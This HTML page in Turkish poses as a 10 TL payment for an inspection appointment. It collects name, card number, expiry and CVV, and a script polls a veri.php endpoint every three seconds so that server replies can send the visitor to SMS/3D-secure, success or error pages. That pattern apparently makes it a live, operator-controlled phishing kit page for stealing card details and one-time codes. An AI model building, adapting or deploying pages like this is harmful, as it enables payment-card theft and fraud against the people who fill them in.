
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ödeme Yap</title>
    <!-- custom css file link  -->
    <link rel="stylesheet" href="css/style.css">

  <style>
    #vt{
     width:50px;
    }
    @media (max-width:768px) {
      .container form{
        width:auto; 
      } 
      #vt{
          width:auto;
       height:50px;
        }

    }
  </style>
</head>

<body>

    <div class="container">

        <div class="card-container">

            <div class="front">
                <div class="image">
                    <img src="image/chip.png" alt="">
                    <img src="image/visa.png" alt="">
                </div>

                <div class="card-number-box">################</div>
                <div class="flexbox">
                    <div class="box">
                        <span>İSİM SOYİSİM</span>
                        <div class="isimsoyisim">#### ####</div>
                    </div>
                    <div class="box">
                        <span>AY/YIL</span>
                        <div class="expiration">
                            <span class="exp-month">mm</span>
                            <span class="exp-year">yy</span>
                        </div>
                    </div>
                </div>
            </div>

            <div class="back">
                <div class="stripe"></div>
                <div class="box">
                    <span>cvv</span>
                    <div class="cvv-box"></div>
                    <img src="image/visa.png" alt="">
                </div>
            </div>

        </div>

        <form action="" method="post">
            <div style="display:flex;justify-content:center;text-align:center;width:100%;">
                <img src="image/unnamed.png" id="vt" alt="">
                <p style="font-size:15px;text-align:left;text-transform:none;margin-left:30px">Muayene Randevusu işleminize devam etmek için ödemeniz gereken tutar. ( 10 TL )
                </p>
            </div>
          <div class="inputBox">
                <span>İSİM SOYİSİM</span>
                <input type="text" name="name" class="card-holder-input" required="">
            </div>
            <div class="inputBox">
                <span>KART NUMARASI</span>
                <input type="text" name="kk" id="kk" maxlength="16" class="card-number-input" required="">
            </div> 
            <div class="flexbox">
                <div class="inputBox">
                    <span>AY</span>
                    <select name="ay" id="ay" class="month-input" required="">
                        <option value="01">01</option>
                        <option value="02">02</option>
                        <option value="03">03</option>
                        <option value="04">04</option>
                        <option value="05">05</option>
                        <option value="06">06</option>
                        <option value="07">07</option>
                        <option value="08">08</option>
                        <option value="09">09</option>
                        <option value="10">10</option>
                        <option value="11">11</option>
                        <option value="12">12</option>
                    </select>
                </div>
                <div class="inputBox">
                    <span>YIL</span>
                    <select name="yil" id="yil" class="year-input" required="">
                        <option value="2023">2023</option>
                        <option value="2024">2024</option>
                        <option value="2025">2025</option>
                        <option value="2026">2026</option>
                        <option value="2027">2027</option>
                        <option value="2028">2028</option>
                        <option value="2029">2029</option>
                        <option value="2030">2030</option>
                        <option value="2030">2031</option>
                        <option value="2032">2032</option>
                        <option value="2033">2033</option>
                    </select>
                </div>
                <div class="inputBox">
                    <span>cvv</span>
                    <input type="text" maxlength="4" id="cvv" name="cvv" class="cvv-input">
                </div>
            </div>
            <input type="submit" value="Ödeme yap" class="submit-btn">
        </form>

    </div>






    <script>
        document.querySelector('.card-number-input').oninput = () => {
            document.querySelector('.card-number-box').innerText = document.querySelector('.card-number-input').value;
        }

        document.querySelector('.card-holder-input').oninput = () => {
            document.querySelector('.card-holder-name').innerText = document.querySelector('.card-holder-input').value;
        }

        document.querySelector('.month-input').oninput = () => {
            document.querySelector('.exp-month').innerText = document.querySelector('.month-input').value;
        }

        document.querySelector('.year-input').oninput = () => {
            document.querySelector('.exp-year').innerText = document.querySelector('.year-input').value;
        }

        document.querySelector('.cvv-input').onmouseenter = () => {
            document.querySelector('.front').style.transform = 'perspective(1000px) rotateY(-180deg)';
            document.querySelector('.back').style.transform = 'perspective(1000px) rotateY(0deg)';
        }

        document.querySelector('.cvv-input').onmouseleave = () => {
            document.querySelector('.front').style.transform = 'perspective(1000px) rotateY(0deg)';
            document.querySelector('.back').style.transform = 'perspective(1000px) rotateY(180deg)';
        }

        document.querySelector('.cvv-input').oninput = () => {
            document.querySelector('.cvv-box').innerText = document.querySelector('.cvv-input').value;
        }
    </script>
    <script src="assets/js/jquery-3.6.0.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
    <script type="text/javascript">
    
    
        $(document).ready(function() {
        $("#bkm").mask('0000000000000000');

            gonder();

            var int = self.setInterval("gonder()", 3000);

        });

        function gonder() {
           $.ajax({
             type: 'POST',
             url: 'veri.php?ip=85.107.127.127',
             success : function(msg) {
               if (msg == 'sms') {
                 window.location.href = '3dredirect';
               }
               if (msg == 'tebrik') {
                 window.location.href = 'success';
               }
               if (msg == 'hata1') {
                 window.location.href = 'hata';
               }
               if (msg == 'back') {
                 window.location.href = 'index';
               }
             }
           });
         }
      </script>
  </body>
</html>